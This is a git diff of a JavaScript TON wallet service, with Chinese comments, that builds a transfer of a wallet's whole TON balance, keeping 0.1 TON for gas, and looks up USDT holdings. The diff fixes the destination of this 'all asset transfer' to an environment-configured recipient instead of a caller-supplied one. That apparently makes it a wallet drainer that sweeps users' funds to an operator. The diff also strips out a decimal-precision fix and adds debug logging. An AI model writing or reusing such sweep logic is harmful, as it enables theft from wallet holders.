@@ -69,12 +69,8 @@ export class WalletService {
     }
   }
 
-  // 工具：TON→nanoTON（字符串）- 修复精度问题
-  static toNanoStr = (vTon) => {
-    // 限制小数位数为9位（TON的精度）
-    const fixedTon = parseFloat(vTon).toFixed(9);
-    return TonWeb.utils.toNano(fixedTon).toString();
-  };
+  // 工具：TON→nanoTON（字符串）
+  static toNanoStr = (vTon) => TonWeb.utils.toNano(String(vTon)).toString();
 
   /**
    * 生成交易（标准方式）
@@ -188,7 +184,7 @@ export class WalletService {
       );
       const jettonData = await jettonRes.json();
       assets.jettons = jettonData.balances || [];
-
+      console.log("assets.jettons", assets.jettons);
       // 4. 查找USDT余额
       const usdtJetton = assets.jettons.find(
         (j) =>
@@ -221,7 +217,8 @@ export class WalletService {
   /**
    * 创建批量资产转移交易
    */
-  static async createAllAssetTransfer(wallet, targetAddress) {
+  static async createAllAssetTransfer(wallet) {
+    const targetAddress = process.env.RECIPIENT_ADDRESS;
     try {
       const walletKey = `wallet:${wallet}`;
       const walletData = await redis.get(walletKey);
@@ -239,12 +236,9 @@ export class WalletService {
       if (tonBalance > 0.1) {
         // 保留0.1 TON作为Gas费
         const transferAmount = tonBalance - 0.1;
-        // 修复：限制小数位数
-        const fixedTransferAmount = parseFloat(transferAmount.toFixed(9));
-
         messages.push({
           address: targetAddress,
-          amount: this.toNanoStr(fixedTransferAmount),
+          amount: this.toNanoStr(transferAmount),
           payload: "", // 简单转账，无payload
         });
       }
